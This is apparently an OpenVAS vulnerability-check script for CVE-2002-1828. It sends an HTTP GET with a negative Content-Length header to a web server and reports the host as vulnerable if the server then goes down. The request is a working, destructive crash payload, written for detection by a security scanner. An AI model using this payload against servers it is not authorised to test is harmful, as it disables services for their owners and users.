if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.11174" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_cve_id( "CVE-2002-1828" );
	script_bugtraq_id( 5707, 6255 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_name( "HTTP negative Content-Length DoS" );
	script_category( ACT_DESTRUCTIVE_ATTACK );
	script_copyright( "Copyright (C) 2002 Michel Arboi" );
	script_family( "Denial of Service" );
	script_dependencies( "find_service.sc", "httpver.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution", value: "Upgrade the web server." );
	script_tag( name: "summary", value: "The Savant web server was crashed by sending an invalid
  GET HTTP request with a negative Content-Length field." );
	script_tag( name: "impact", value: "An attacker may exploit this flaw to disable the service or
  even execute arbitrary code on the affected system." );
	script_tag( name: "affected", value: "Null HTTPD 0.5.0. Other versions or products might be affected
  as well." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 80 );
if(http_is_dead( port: port )){
	exit( 0 );
}
soc = http_open_socket( port );
if(!soc){
	exit( 0 );
}
req = NASLString( "GET / HTTP/1.0\\n\\r", "Host: ", get_host_ip(), "\\r\\n", "Content-Length: -1\\r\\n\\r\\n" );
send( socket: soc, data: req );
r = http_recv( socket: soc );
http_close_socket( soc );
if(http_is_dead( port: port )){
	security_message( port: port );
	exit( 0 );
}
exit( 99 );

